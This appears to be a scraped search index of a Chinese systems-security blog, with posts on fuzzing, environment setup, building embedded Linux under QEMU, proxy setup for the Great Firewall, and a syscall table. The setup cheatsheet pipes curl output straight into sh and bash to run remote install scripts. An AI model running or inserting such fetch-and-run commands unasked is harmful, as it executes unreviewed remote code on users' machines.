NEW_FUNC[0/1]: 0x5aae80 in TransformDictionaryWord... #64 NEW cov: 651 ft: 1148 corp: 14/832Kb exec/s: 0 rss: 63Mb L: 67832/68784 MS: 1 ChangeBinInt- ... #535 NEW cov: 705 ft: 1620 corp: 48/3038Kb exec/s: 0 rss: 162Mb L: 68784/68784 MS: 1 ChangeBinInt- ... #288595 NEW cov: 839 ft: 2909 corp: 489/30Mb exec/s: 1873 rss: 488Mb L: 62832/68784 MS: 1 ShuffleBytes- ... As you can see, the initial coverage is much greater than before (INITED cov: 632) and it keeps growing.\nThe size of the inputs that libFuzzer tries is now limited by 168276, which is the size of the largest file in the seed corpus. You may change that with -max_len=N.\nYou may interrupt the fuzzer at any moment and restart it using the same command line. It will start from where it stopped.\n","date":"2022-05-11T13:57:01+08:00","image":"https://lcamtuf.coredump.cx/afl/afl_screen.png","permalink":"https://cerr.cc/post/zkv%E7%9A%84fuzzing%E6%97%A9%E6%95%99/","title":"ZKV的Fuzzing早教"},{"content":" 作为一个系统重装爱好者和硬件收集拾荒人，为了减少在环境配置上浪费的生命，记录常用环境配置命令用以直接复制粘贴\n个人 apt 源 Linux 初始环境软件安装 基本组件 1 2 3 4 sudo apt install zsh git man man-db manpages ssh neovim tmux \\ curl wget netcat net-tools nmap tcpdump figlet bat \\ binutils xxd strace libncurses5-dev traceroute network-manager \\ neofetch zip unzip ncdu htop dosfstools nyancat cmatrix 开发与调试组件 1 2 sudo apt install gcc g++ gdb gdb-multiarch gdbserver flex bison make cmake clangd \\ python3 ipython3 python-is-python3 python3-pip build-essential ninja-build dotfiles 快速就位 1 2 3 4 5 6 7 8 git clone https://github.com/dev2ero/dotfiles.git sh -c \u0026#34;$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\u0026#34; git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting mkdir -p ~/.config/nvim/ cp `pwd`/dotfiles/init.lua ~/.config/nvim/init.lua cp `pwd`/dotfiles/zshrc ~/.zshrc source ~/.zshrc Neovim 配置 插件管理器 1 2 3 4 5 6 7 8 9 10 # vim-plug sh -c \u0026#39;curl -fLo \u0026#34;${XDG_DATA_HOME:-$HOME/.local/share}\u0026#34;/nvim/site/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\u0026#39; # packer.vim git clone --depth 1 https://github.com/wbthomason/packer.nvim ~/.local/share/nvim/site/pack/packer/start/packer.nvim mkdir -p ~/.config/nvim/lua/ cat \u0026gt;\u0026gt; ~/.config/nvim/lua/plugins.lua \u0026lt;\u0026lt; EOF return require(\u0026#39;packer\u0026#39;).startup(function() use \u0026#39;wbthomason/packer.nvim\u0026#39; end) EOF Coc.nvim 1 CocInstall coc-marketplace | CocInstall coc-clangd | CocInstall coc-pyright | CocInstall coc-highlight | CocInstall coc-cmake docker 安装 官方安装脚本：\n1 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 拉取特定镜像并设定共享文件夹：\n1 sudo docker run -it -v /home/zkv/docker_share/:/share ubuntu:16.04 pwn 环境简易就位 1 2 3 4 apt install gdb gdb-multiarch gdbserver git clone https://github.com/pwndbg/pwndbg; cd pwndbg; ./setup.sh echo -n \u0026#34;set syntax-highlight-style tango\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit pip install some-package -i https://pypi.tuna.tsinghua.edu.cn/simple ","date":"2022-05-10T21:13:54+08:00","image":"https://s2.loli.net/2022/05/11/7aWbNEkesXlmYxH.jpg","permalink":"https://cerr.cc/post/%E4%B8%80%E4%BA%9B%E9%85%8D%E7%8E%AF%E5%A2%83%E7%9A%84cheasheet/","title":"一些配环境的Cheasheet"},{"content":"自动挡 一路默认 通过git或http获取buildroot：\n官网：https://buildroot.org/\ngit：git clone https://git.buildroot.net/buildroot\n进入buildroot根目录，可以看到一个叫configs的文件夹，其中记录了许多硬件平台和部分qemu虚拟平台的默认配置参数。执行 ls configs | grep qemu，可以看到：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 qemu_aarch64_sbsa_defconfig qemu_aarch64_virt_defconfig qemu_arm_versatile_defconfig qemu_arm_versatile_nommu_defconfig qemu_arm_vexpress_defconfig qemu_arm_vexpress_tz_defconfig qemu_m68k_mcf5208_defconfig qemu_m68k_q800_defconfig qemu_microblazebe_mmu_defconfig qemu_microblazeel_mmu_defconfig qemu_mips32r2el_malta_defconfig qemu_mips32r2_malta_defconfig qemu_mips32r6el_malta_defconfig qemu_mips32r6_malta_defconfig qemu_mips64el_malta_defconfig qemu_mips64_malta_defconfig qemu_mips64r6el_malta_defconfig qemu_mips64r6_malta_defconfig qemu_nios2_10m50_defconfig qemu_or1k_defconfig qemu_ppc64_e5500_defconfig qemu_ppc64le_powernv8_defconfig qemu_ppc64le_pseries_defconfig qemu_ppc64_pseries_defconfig qemu_ppc_bamboo_defconfig qemu_ppc_e500mc_defconfig qemu_ppc_g3beige_defconfig qemu_ppc_mac99_defconfig qemu_ppc_mpc8544ds_defconfig qemu_riscv32_virt_defconfig qemu_riscv64_virt_defconfig qemu_s390x_defconfig qemu_sh4eb_r2d_defconfig qemu_sh4_r2d_defconfig qemu_sparc64_sun4u_defconfig qemu_sparc_ss10_defconfig qemu_x86_64_defconfig qemu_x86_defconfig qemu_xtensa_lx60_defconfig qemu_xtensa_lx60_nommu_defconfig 举例来讲，我们使用 make qemu_arm_vexpress_defconfig，将qemu模拟的vexperss平台设为编译目标：\n1 2 make qemu_arm_vexpress_defconfig make 或者使用 make menuconfig 手动配置。\n等待编译完成，即可在output文件夹中拿到相应目标文件：\n1 2 3 output/images/zImage # 内核 output/images/rootfs.ext2 # ext2根文件系统镜像 output/images/vexpress-v2p-ca9.dtb # arm设备树 使用qemu-system-arm运行得到的linux：\n1 2 3 4 5 6 7 8 9 10 qemu-system-arm \\ -M vexpress-a9 \\ -smp 1 \\ -m 256 \\ -kernel output/images/zImage \\ -dtb output/images/vexpress-v2p-ca9.dtb \\ -drive file=output/images/rootfs.ext2,if=sd,format=raw \\ -append \u0026#34;console=ttyAMA0,115200 root=/dev/mmcblk0\u0026#34; \\ -serial stdio \\ -nographic 弄完发现过程竟如此简单，buildroot把所有活都干了……\n全自动方案中的定制 即使需要定制部分组件，也是能借力buildroot的全自动化方案的。\n先导入自己需要的全自动方案的默认配置，再使用make menuconfig对其生成的.config进行定制：\n1 2 make qemu_aarch64_virt_defconfig make menuconfig 举例来说，如果我的需求是使用第三方内核，则修改：\n1 2 Kernel ---\u0026gt; Kernel version (Custom Git repository) 记一次旧版本工具链的自动挡构建 这一节实际上由另一篇文章合并而来，故与上下文不衔接，内容独立。\n构建这一步，能用好buildroot的话基本就没有多少需要手动配置的步骤了。\n构建特定的目标前，我们要确定好各种参数：指令集架构、工具链、链接库……这当然都是可以经由make menuconfig一点点设定好的。不过更常用更快捷的方式，还是直接指定一个完全满足如上所有参数的特定平台，使用其defconfig即可。\n眼下我需要一个4.9LTS版本的内核，就以此为例了。\n首先由git仓库获取buildroot，而非由http下载特定发行包。这样做带来的方便是“一次下载，终生更新，随时切换”：\n1 git clone https://git.buildroot.net/buildroot 由于内核版本对于构建环境的依赖，往往容易出现各种环境不匹配导致的编译失败，即是使用buildroot也自动构建也一样。所以我通常有如下三种递增的解决方案：\n最新版本buildroot中直接指定旧版本内核进行构建 在与目标内核版本匹配的旧版本buildroot中进行构建 在与 目标版本内核和buildroot版本 都匹配的 旧版发行版的docker容器中 进行构建 由上到下，麻烦度递增，但构建成功率也递增。\n这里选取方案二继续进行演示。\n来此查询到Linux Kernel 4.9 LTS的发布日期：https://en.wikipedia.org/wiki/Linux_kernel_version_history\n2016年12月。嗯，看看同时期的buildroot版本有：\n1 2 3 4 5 ➜ buildroot git:(master) git switch 2012.11.x 2016.08.x 2017.08.x 2018.08.x 2019.08.x 2020.08.x 2021.08.x next 2013.08.x 2016.11.x 2017.11.x 2018.11.x 2019.11.x 2020.11.x 2021.11.x 2015.08.x 2017.02.x 2018.02.x 2019.02.x 2020.02.x 2021.02.x 2022.02.x 2015.11.x 2017.05.x 2018.05.x 2019.05.x 2020.05.x 2021.05.x master 晚于内核发布且最贴近的是2017.02.x，switch过去：\n1 2 3 ➜ buildroot git:(master) git switch 2017.02.x Branch \u0026#39;2017.02.x\u0026#39; set up to track remote branch \u0026#39;2017.02.x\u0026#39; from \u0026#39;origin\u0026#39;. Switched to a new branch \u0026#39;2017.02.x\u0026#39; 由于我需要的目标平台是aarch64的virt，故搜索buildroot提供的默认配置defconfig并使用。接着make开始构建即可：\n1 2 3 4 5 6 ➜ buildroot git:(2017.02.x) ls configs | grep qemu | grep aarch qemu_aarch64_virt_defconfig ➜ buildroot git:(2017.02.x) make qemu_aarch64_virt_defconfig …… ➜ buildroot git:(2017.02.x) make …… 喝几杯咖啡的时间（具体是几杯取决于你host的配置与网络环境），就能在output中拿到所有的结果：编译工具链、内核、链接库、rootfs、可引导磁盘镜像、qemu虚拟机一键启动脚本……\n☕️☕️☕️……\n好诶！居然又失败了😩👇\n1 make: *** [package/pkg-generic.mk:219: /buildroot/output/build/host-m4-1.4.18/.stamp_built] Error 2 所以还得接着写。启动方案三，准备docker container：\n1 2 3 4 5 6 7 8 9 10 11 ➜ ~ docker pull ubuntu:18.04 18.04: Pulling from library/ubuntu 09db6f815738: Pull complete Digest: sha256:478caf1bec1afd54a58435ec681c8755883b7eb843a8630091890130b15a79af Status: Downloaded newer image for ubuntu:18.04 docker.io/library/ubuntu:18.04 ➜ ~ docker run -it -v /host_path:/guest_path ubuntu:18.04 /bin/bash root@c1c9ce358373:/# exit ➜ ~ docker start c1; docker exec -it c1 /bin/bash c1 root@c1c9ce358373:/# 好了，这下buildroot也在老环境内了，再次重复上述步骤即可。\n换用ubuntu18.04果然成功了、\n如果你和我一样懒得弄共享文件夹，就直接来/var/lib/docker/overlay2中取货吧。毕竟docker只是在文件系统层做了虚拟化，甚至连虚拟磁盘都不需要，直接在host的文件系统中存放了guest的文件。\n1 2 3 4 5 6 7 8 9 10 ➜ ~ cd /var/lib/docker/overlay2 ➜ overlay2 du -h -d 1 7.8G ./d8ef00627999edcb9a6fee28d49bf9312f3bb56ca62101ce8850b3b406c4c498 40K ./d8ef00627999edcb9a6fee28d49bf9312f3bb56ca62101ce8850b3b406c4c498-init 69M ./cd42e49af35fa4606d2b1f029e089cc3caca7658ff0b6e2bca950dc7379318ee 16K ./l 7.9G . ➜ overlay2 cd d8ef00627999edcb9a6fee28d49bf9312f3bb56ca62101ce8850b3b406c4c498/merged/ ➜ merged ls bin boot buildroot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 接着进入buildroot/output取货即可。虽然其中已有4.9.6的内核了，不过我需要的是由此得到的编译工具链，以便编译自行定制的4.9版本内核。（旧版内核需要旧版工具链编译）\n手动档 编译工具链 这个好说，方才Easymode里不是刚好做了一个嘛。buildroot构建好了所有target目标，自然也为此生成了完整的host构建工具链。\n若目标为旧版本内核，则需要旧版本工具链，构建方式在另一篇文章中有记录：https://cerr.cc/post/cross-debug-old-version-kernel-using-qemu-system/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 ➜ buildroot git:(master) ls arch CHANGES configs dl linux output support utils board Config.in COPYING docs Makefile package system boot Config.in.legacy DEVELOPERS fs Makefile.legacy README toolchain ➜ buildroot git:(master) ls output build host images staging target ➜ buildroot git:(master) ls output/build buildroot-config host-meson-0.62.1 buildroot-fs host-mpc-1.2.1 build-time.log host-mpfr-4.1.0 busybox-1.35.0 host-ninja-1.10.2.g51db2.kitware.jobserver-1 host-acl-2.3.1 host-openssl host-attr-2.5.1 host-patchelf-0.9 host-autoconf-2.71 host-pcre-8.45 host-autoconf-archive-2021.02.19 host-pixman-0.40.0 host-automake-1.16.5 host-pkgconf-1.6.3 host-binutils-2.37 host-python3-3.10.4 host-bison-3.8.2 host-python-setuptools-62.1.0 host-cmake-3.18.6 host-qemu-7.0.0 host-dtc-1.6.1 host-skeleton host-e2fsprogs-1.46.5 host-util-linux-2.38 host-expat-2.4.7 host-zlib host-fakeroot-1.26 ifupdown-scripts host-flex-2.6.4 initscripts host-gcc-final-10.3.0 linux-5.15.18 host-gcc-initial-10.3.0 linux-headers-5.15.18 host-gettext locales.nopurge host-gettext-tiny-0.3.2 packages-file-list-host.txt host-gmp-6.2.1 packages-file-list-staging.txt host-kmod-29 packages-file-list.txt host-libffi-3.4.2 skeleton host-libglib2-2.70.4 skeleton-init-common host-libopenssl-1.1.1o skeleton-init-sysv host-libtool-2.4.6 toolchain host-libzlib-1.2.12 toolchain-buildroot host-m4-1.4.19 uclibc-1.0.40 host-makedevs urandom-scripts ➜ buildroot git:(master) ls output/host aarch64-buildroot-linux-uclibc bin doc etc include lib lib64 libexec sbin share usr var ➜ buildroot git:(master) ls output/target bin etc lib64 media opt root sbin THIS_IS_NOT_YOUR_ROOT_FILESYSTEM usr dev lib linuxrc mnt proc run sys tmp var ➜ buildroot git:(master) ls output/images Image rootfs.ext2 rootfs.ext4 start-qemu.sh ➜ buildroot git:(master) ls output/staging bin dev etc lib lib64 media mnt opt proc root run sbin sys tmp usr ➜ buildroot git:(master) file output/staging output/staging: symbolic link to /f/software/buildroot/output/host/aarch64-buildroot-linux-uclibc/sysroot output/host下即是面向buildroot构建前设定的目标平台的编译工具链。\n编译工具链的命名遵循 arch-vendor-(os-)abi 的格式\n同时也可以直接从这些地方下载到：\narm cortex-a:The GNU Toolchain for the Cortex-A Family Downloads\narm cortex-m:GNU Arm Embedded Toolchain Downloads\nLinaro:arm:https://www.linaro.org/downloads/\nrisc-v:https://github.com/riscv/riscv-gnu-toolchain/releases\nmips:https://www.mips.com/develop/tools/compilers/linux-toolchain/\nuclibc:https://www.uclibc.org/downloads/binaries/\nhttp://download.ronetix.info/toolchains/\n若实在没有啥特殊需求， apt install gcc-aarch64-linux-gnu大部分情况下也能直接解决问题。\nOS/ABI的匹配 通常情况下，选取编译交叉编译工具链时，指令集、平台之类的内容是不容易弄错的。但 OS/ABI 却是个容易造成故障的点。\n举例来讲，在我一次对libnvram.so的编译时，得到的目标ELF文件为：\n1 2 3 4 5 6 7 8 9 10 11 ~$ file libnvram.so libnvram.so: ELF 32-bit LSB shared object, ARM, version 1 (ARM), dynamically linked, not stripped ~$ armv5l-readelf -h libnvram.so ELF Header: Magic: 7f 45 4c 46 01 01 01 61 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2\u0026#39;s complement, little endian Version: 1 (current) OS/ABI: ARM ...... 使用该自行编译的libnvram.so导致报错：\n1 /sbin/init: error while loading shared libraries: /lib/libnvram.so: ELF file OS ABI invalid 而原版无故障的libnvram.so为：\n1 2 3 4 5 6 7 8 9 10 11 ~$ file libnvram.so libnvram.so: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, not stripped ~$ armv5l-readelf -h libnvram.so ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2\u0026#39;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ...... 可以看到，两者的OS/ABI，一个是ARM，一个是UNIX - System V\nABI描述应用程序与操作系统、应用程序与库、应用程序的组成部分之间的低层接口。ABI允许编译好的目标代码在使用兼容ABI的系统中无需改动就能运行\n导致这一结果的原因是：使用OABI编译工具链编译出的结果为OS/ABI: ARM，而使用EABI编译工具链编译出的结果为OS/ABI: UNIX - System V。关于OABI与EABI的区别，参见：https://docs.embeddedts.com/EABI_vs_OABI\n故换用标识了eabi的工具链重新编译即解决了该问题。\nKernel Linux源码结构 手动构建内核前，先了解下内核源码的文件树结构。以2022/6/1的linux源码为例：\n1 2 3 4 ➜ linux git:(master) ls arch COPYING Documentation include Kbuild lib Makefile README security usr block CREDITS drivers init Kconfig LICENSES mm samples sound virt certs crypto fs ipc kernel MAINTAINERS net scripts tools arch The arch subdirectory contains all of the architecture specific kernel code. It has further subdirectories, one per supported architecture, for example i386 and alpha. include The include subdirectory contains most of the include files needed to build the kernel code. It too has further subdirectories including one for every architecture supported. The /include/asm subdirectory is a soft link to the real include directory needed for this architecture, for example /include/asm-i386. To change architectures you need to edit the kernel makefile and rerun the Linux kernel configuration program. init This directory contains the initialization code for the kernel and it is a very good place to start looking at how the kernel works. mm This directory contains all of the memory management code. The architecture specific memory management code lives down in /arch/*/mm/, for example /arch/i386/mm/fault.c. drivers All of the system\u0026rsquo;s device drivers live in this directory. They are further sub-divided into classes of device driver, for example block. ipc This directory contains the kernels inter-process communications code. modules This is simply a directory used to hold built modules. fs All of the file system code. This is further sub-divided into directories, one per supported file system, for example vfat and ext2. kernel The main kernel code. Again, the architecture specific kernel code is in /arch/*/kernel. net The kernel\u0026rsquo;s networking code. lib This directory contains the kernel\u0026rsquo;s library code. The architecture specific library code can be found in /arch/*/lib/. scripts This directory contains the scripts (for example awk and tk scripts) that are used when the kernel is configured. Linux构建系统 同时需要先了解下 .config、defconfig、Kconfig\nhttps://stackoverflow.com/questions/41885015/what-exactly-does-linux-kernels-make-defconfig-do https://www.linuxjournal.com/content/kbuild-linux-kernel-build-system 总的来说，the Linux Kernel Build System has four main components:\nConfig symbols: compilation options that can be used to compile code conditionally in source files and to decide which objects to include in a kernel image or its modules. Kconfig files: define each config symbol and its attributes, such as its type, description and dependencies. Programs that generate an option menu tree (for example, make menuconfig) read the menu entries from these files. .config file: stores each config symbol\u0026rsquo;s selected value. You can edit this file manually or use one of the many make configuration targets, such as menuconfig and xconfig, that call specialized programs to build a tree-like menu and automatically update (and create) the .config file for you. Makefiles: normal GNU makefiles that describe the relationship between source files and the commands needed to generate each make target, such as kernel images and modules. 至于defconfig，则一般由平台厂商提供，里面含有了目标平台相关的一些默认参数，内核编译用做.config的参考。同时遵守如下规则：\nif option is mentioned in defconfig, build system puts that option into .config with value chosen in defconfig if option isn\u0026rsquo;t mentioned in defconfig, build system puts that option into .config using its default value, specified in corresponding Kconfig 由此确保构建出的内核与特定平台匹配。\ndefconfig文件存放于arch/*/configs/路径下，如：\n1 2 3 4 5 ➜ linux git:(master) ls arch/arm/configs/ am200epdkit_defconfig gemini_defconfig multi_v5_defconfig s5pv210_defconfig aspeed_g4_defconfig h3600_defconfig multi_v7_defconfig sama5_defconfig aspeed_g5_defconfig h5000_defconfig mv78xx0_defconfig sama7_defconfig ...... 至于make defconfig究竟干了啥，可以使用V=1参数查看：\n1 make V=1 defconfig 开始构建 现来此挑选中意的内核版本：https://en.wikipedia.org/wiki/Linux_kernel_version_history\n我这边以5.4版本内核为例继续实验：\n1 2 3 4 5 6 7 8 9 10 11 12 git clone https://github.com/torvalds/linux.git # 1day mirror git clone https://gitee.com/mirrors/linux_old1.git cd linux # 切换到特定版本 git checkout v5.4 # 创建目标文件夹 mkdir build # 导入aarch64的defconfig make ARCH=arm64 O=./build defconfig # 自定义配置 make O=./build menuconfig 由于我们的目标平台是QEMU Virtio，故需要于make menuconfig中启用相应配置：VIRTIO_BLK, SCSI_BLK, VIRTIO_NET, HVC_DRIVER, VIRTIO_CONSOLE, VIRTIO, VIRTIO_MMIO。详细的Kernel config参考也可以从buildroot/board/qemu中找到。\n至于Virtio具体是个啥，参考：\nhttps://wiki.libvirt.org/page/Virtio https://wiki.osdev.org/Virtio https://www.linux-kvm.org/page/Virtio https://zhuanlan.zhihu.com/p/68154666 https://www.anquanke.com/post/id/224001 https://developer.ibm.com/articles/l-virtio/ 在make menuconfig中启用路径如下：\n1 2 3 4 5 6 7 8 9 10 Device Drivers ---\u0026gt; [*] Virtio drivers Device Drivers ---\u0026gt; [*] Network device support ---\u0026gt; \u0026lt;*\u0026gt; Virtio network driver Device Drivers ---\u0026gt; [*] Block devices ---\u0026gt; \u0026lt;*\u0026gt; Virtio block driver 如想要手动添加内核驱动，参考：https://stackoverflow.com/questions/11710022/adding-new-driver-code-to-linux-source-code\nTip: If you want a sample of linux.config for a specific platform, take a look at buildroot/board\n配置完毕，开始编译：\n1 make O=./build CROSS_COMPILE=aarch64-linux-gnu- -j`nproc` 注意将 aarch64-linux-gnu- 换成你当前的编译工具链路径\n得到的Image和vmlinux路径为：\n1 2 3 4 ➜ linux git:(219d54332a09) find . -name Image ./build/arch/arm64/boot/Image ➜ linux git:(219d54332a09) find . -name vmlinux ./build/vmlinux 通过qemu-system运行 网桥的预配置 后续host于qemu-system中的guest将通过网桥连接，故先于host中配置网桥。\n首先准备网桥与tun/tap虚拟网卡：\n创建网桥br0：\n1 sudo brctl addbr br0 为当前用户创建tun/tap虚拟网卡tap0：\n1 tunctl -t tap0 -u ${USER} 若发现brctl与tunctl命令未找到，则需要先安装相应软件包。这里推荐一个网站，可以方便的查询一个命令在不同软件源中对应的包名：https://command-not-found.com/（专治command not found 20 年）\n","date":"2022-05-10T20:59:43+08:00","image":"https://s2.loli.net/2022/05/08/2DqjsbwNpdUM4XA.jpg","permalink":"https://cerr.cc/post/%E6%9E%84%E5%BB%BA%E4%B8%8E%E8%BF%90%E8%A1%8C%E5%B5%8C%E5%85%A5%E5%BC%8Flinux%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"构建与运行嵌入式linux虚拟机"},{"content":" 当我老了，回顾一生，就会发觉，我三分之一的生命，都浪费在和GFW作斗争上了。\n呜呼！何等宏伟啊！两千年多前的巨石，砌就秦帝国的坚不可摧；今日那日夜呼啸的服务器集群，彰显共和国非凡的制度自信。😫\nTop-level solution selection In terms of the ways I have tried myself:\nUse a VPN application Rent an overseas server Subscribe to an airport service The last option strikes the best balance between price and convenience.\nAs for the first two option:\nBeware of phishing High cost in time or money Stability is a concern 个人客户端解决方案 具体使用方面就大白话讲了\n垃机佬出身的我，手里硬件设备的数量经常令得旁人惊异。即使到了渐渐退烧的今天，我手中也是保有了各个主流操作系统平台的物理机。\n顶层协议方面，v2ray和ssr都有使用，未尝试过自行编写或改进加密协议。服务端一年200左右的机场全够用了。客户端目前使用方案如下：\nWindows v2rayNG：https://github.com/2dust/v2rayN Linux v2rayA：https://github.com/v2rayA/v2rayA MacOS ClashX：https://github.com/yichengchen/clashX iOS shadowrocket：外区APP Store下载 Android v2rayNG：https://github.com/2dust/v2rayNG 代理层次 在TCP/IP协议栈的不同层设定的代理，会对系统与应用产生不同影响。\n许多VPN软件都是利用了tun/tap创建了虚拟网卡，将系统中所有流量直接通过虚拟网卡转发至代理服务器。这种方案代理于链接层，全局代理效果好。但同时由此带来的缺点是，一些我们不想被代理的流量也会经由代理服务器转发了。部分SSR、v2ray客户端有tun模式，也是同样的道理。\n再者就是于操作系统层面配置系统代理，这样一来所以会遵循系统代理设置的应用都会被代理。但同时也会有其它一些不遵守系统代理的应用。举例来讲，chrome默认是走系统代理的，而firefox则需手动配置选择代理方案。如右图是Windows11的系统代理设置，红框内的文字说明了其与VPN使用虚拟网卡的方案并不重叠。\n故若需要更精细化地控制系统中不同组件的代理行为，则更适合于使用应用层的代理接口。这种情况下，代理软件客户端做的仅仅是在本地打开一个端口用来监听和服务上层应用主动发来的代理请求，以此将是否被代理的选择权交由了每个应用本身。举例来说，v2rayN的蓝色图标对应的“清除系统代理”就是这种方案。\n部分网站的镜像 Google https://www.ahhhhfs.com/4810/ Github https://www.ahhhhfs.com/18927/ https://www.ahhhhfs.com/18876/ https://www.ahhhhfs.com/5442/ Youtube https://www.ahhhhfs.com/16819/ 各种应用的代理配置与镜像 chrome chrome 默认遵从系统代理。可是使用Proxy SwitchyOmega插件对chrome代理方式进行手动配置：\nhttps://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif\nLinux软件源 不同Linux发行版具有不同的包管理器。即使是同一个发行版的不同版本（比如Ubuntu18.04与Ubuntu20.04），其上游软件源也是不同的。\n使用国内镜像为软件源换源可以大大加速安装软件源上的软件的过程。以tuna维护的清华源为例，我们来到使用帮助页面：https://mirrors.tuna.tsinghua.edu.cn/help\n点击任意你想要使用清华源的服务（Linux软件源自然也涵盖在内），即能看到tuna为你提供的相应使用教程。（对于Linux软件源，需选定正确的系统版本）。\npip 可使用清华源：https://mirrors.tuna.tsinghua.edu.cn/help/pypi/\n若使用代理方案，在~/.config/pip/pip.conf，中添加：（将http://127.0.0.1:1080替换为你本地的http代理地址）\n1 2 [global] proxy=http://127.0.0.1:1080 不支持socks5协议\ngit （将http://127.0.0.1:1080替换为你本地的socks5代理地址）\n1 git config --global http.proxy socks5://127.0.0.1:1080 apt 在 /etc/apt/apt.conf.d/ 目录下新增 proxy.conf 文件，加入：（将http://127.0.0.1:1080替换为你本地的http代理地址）\n1 2 Acquire::http::Proxy \u0026#34;http://127.0.0.1:1080/\u0026#34;; Acquire::https::Proxy \u0026#34;http://127.0.0.1:1080/\u0026#34;; 不支持socks5协议\ncurl、wget 许多posix标准的命令行程序会遵从两个环境变量：\n1 2 export http_proxy=http://proxyserver:port/ export https_proxy=https://proxyserver:port/ curl也是其中之一。\n同时，也可以使用curl的-x、--proxy参数达到同样效果：\n1 -x, --proxy \u0026lt;[protocol://][user:password@]proxyhost[:port]\u0026gt; 若想要curl的代理配置永久生效，向~/.curlrc写入：socks5 = \u0026quot;127.0.0.1:1080\u0026quot;。\n同时，curl遵循但wget不遵循的环境变量为：\n1 export all_proxy=http://proxyserver:port/ 合法翻墙 澳门流量卡 就是这货👇，淘宝上就可以买到。\n其他攻略 2022永久免费白嫖节点方法 https://www.ahhhhfs.com/19188/ 使用Google搜索找机场（梯子）技巧 https://www.ahhhhfs.com/10889/ ","date":"2022-05-09T11:03:28+08:00","image":"https://s2.loli.net/2022/05/09/FrNVRw5lSbfusgx.jpg","permalink":"https://cerr.cc/post/fuck-the-great-fire-wall/","title":"Fuck the Great Fire Wall"},{"content":"传参规则 arch syscall NR return arg0 arg1 arg2 arg3 arg4 arg5 arm r7 r0 r0 r1 r2 r3 r4 r5 arm64 x8 x0 x0 x1 x2 x3 x4 x5 x86 eax eax ebx ecx edx esi edi ebp x86_64 rax rax rdi rsi rdx r10 r8 r9 x86_64 系统调用表 以下调用表皆基于linux4.14.0\nNR syscall name %rax arg0 (%rdi) arg1 (%rsi) arg2 (%rdx) 0 read 0x00 unsigned int fd char *buf size_t count 1 write 0x01 unsigned int fd const char *buf size_t count 2 open 0x02 const char *filename int flags umode_t mode 3 close 0x03 unsigned int fd - - 4 stat 0x04 const char *filename struct __old_kernel_stat *statbuf - 5 fstat 0x05 unsigned int fd struct __old_kernel_stat *statbuf - 6 lstat 0x06 const char *filename struct __old_kernel_stat *statbuf - 7 poll 0x07 struct pollfd *ufds unsigned int nfds int timeout 8 lseek 0x08 unsigned int fd off_t offset unsigned int whence 9 mmap 0x09 ? ? ? 10 mprotect 0x0a unsigned long start size_t len unsigned long prot 11 munmap 0x0b unsigned long addr size_t len - 12 brk 0x0c unsigned long brk - - 13 rt_sigaction 0x0d int const struct sigaction * struct sigaction * 14 rt_sigprocmask 0x0e int how sigset_t *set sigset_t *oset 15 rt_sigreturn 0x0f ? ? ? 16 ioctl 0x10 unsigned int fd unsigned int cmd unsigned long arg 17 pread64 0x11 unsigned int fd char *buf size_t count 18 pwrite64 0x12 unsigned int fd const char *buf size_t count 19 readv 0x13 unsigned long fd const struct iovec *vec unsigned long vlen 20 writev 0x14 unsigned long fd const struct iovec *vec unsigned long vlen 21 access 0x15 const char *filename int mode - 22 pipe 0x16 int *fildes - - 23 select 0x17 int n fd_set *inp fd_set *outp 24 sched_yield 0x18 - - - 25 mremap 0x19 unsigned long addr unsigned long old_len unsigned long new_len 26 msync 0x1a unsigned long start size_t len int flags 27 mincore 0x1b unsigned long start size_t len unsigned char * vec 28 madvise 0x1c unsigned long start size_t len int behavior 29 shmget 0x1d key_t key size_t size int flag 30 shmat 0x1e int shmid char *shmaddr int shmflg 31 shmctl 0x1f int shmid int cmd struct shmid_ds *buf 32 dup 0x20 unsigned int fildes - - 33 dup2 0x21 unsigned int oldfd unsigned int newfd - 34 pause 0x22 - - - 35 nanosleep 0x23 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - 36 getitimer 0x24 int which struct __kernel_old_itimerval *value - 37 alarm 0x25 unsigned int seconds - - 38 setitimer 0x26 int which struct __kernel_old_itimerval *value struct __kernel_old_itimerval *ovalue 39 getpid 0x27 - - - 40 sendfile 0x28 int out_fd int in_fd off_t *offset 41 socket 0x29 int int int 42 connect 0x2a int struct sockaddr * int 43 accept 0x2b int struct sockaddr * int * 44 sendto 0x2c int void * size_t 45 recvfrom 0x2d int void * size_t 46 sendmsg 0x2e int fd struct user_msghdr *msg unsigned flags 47 recvmsg 0x2f int fd struct user_msghdr *msg unsigned flags 48 shutdown 0x30 int int - 49 bind 0x31 int struct sockaddr * int 50 listen 0x32 int int - 51 getsockname 0x33 int struct sockaddr * int * 52 getpeername 0x34 int struct sockaddr * int * 53 socketpair 0x35 int int int 54 setsockopt 0x36 int fd int level int optname 55 getsockopt 0x37 int fd int level int optname 56 clone 0x38 unsigned long unsigned long int * 57 fork 0x39 - - - 58 vfork 0x3a - - - 59 execve 0x3b const char *filename const char *const *argv const char *const *envp 60 exit 0x3c int error_code - - 61 wait4 0x3d pid_t pid int *stat_addr int options 62 kill 0x3e pid_t pid int sig - 63 uname 0x3f struct old_utsname * - - 64 semget 0x40 key_t key int nsems int semflg 65 semop 